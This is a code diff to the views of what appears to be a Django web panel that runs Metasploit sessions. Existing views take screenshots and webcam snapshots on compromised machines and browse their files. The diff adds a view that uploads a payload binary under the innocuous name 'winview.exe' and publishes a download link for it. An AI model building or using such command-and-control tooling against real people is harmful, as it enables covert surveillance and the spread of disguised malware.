@@ -5,6 +5,9 @@ import urllib
 from django.shortcuts import render, redirect
 from core.MsfToolbox import *
 from datetime import datetime
+from django.core.files.storage import FileSystemStorage
+import anssi.settings
+
 
 import time
 # Create your views here.
@@ -43,8 +46,8 @@ def session_information(request, id):
 
 
 def action_screenshot(request, id):
-        toolbox.post_take_screenshot(session=int(id))
-        return redirect(session_screenshot, id)
+	toolbox.post_take_screenshot(session=int(id))
+	return redirect(session_screenshot, id)
 
 
 def session_screenshot(request, id):
@@ -54,8 +57,8 @@ def session_screenshot(request, id):
 
 
 def action_webcam(request, id):
-        toolbox.post_take_snapshot(session=int(id))
-        return redirect(session_webcam, id)
+	toolbox.post_take_snapshot(session=int(id))
+	return redirect(session_webcam, id)
         
 
 def session_webcam(request, id):
@@ -100,3 +103,27 @@ def session_explorer(request, id):
 
 
 	return render(request, 'server/session_explorer.html', {'id': int(id), 'files': files, 'pwd': pwd})
+
+def upload_payload(request):
+	payload_link = '/media/payload/winview.exe'
+	payload_file = os.path.join(anssi.settings.MEDIA_ROOT, 'payload', 'winview.exe')
+	payload_exists = False 
+
+	if os.path.exists(payload_file):
+		payload_exists = True
+
+	uploaded = False
+
+	if request.method == 'POST':
+		uploaded_file = request.FILES.get('payload_binary', None)
+
+		fs = FileSystemStorage()
+
+		if payload_exists:
+			print payload_file
+			fs.delete(payload_file)
+
+		filename = fs.save('payload/winview.exe', uploaded_file)
+		uploaded = True
+
+	return render(request, 'server/payload.html', {'uploaded': uploaded, 'link': payload_link, 'exists': payload_exists})
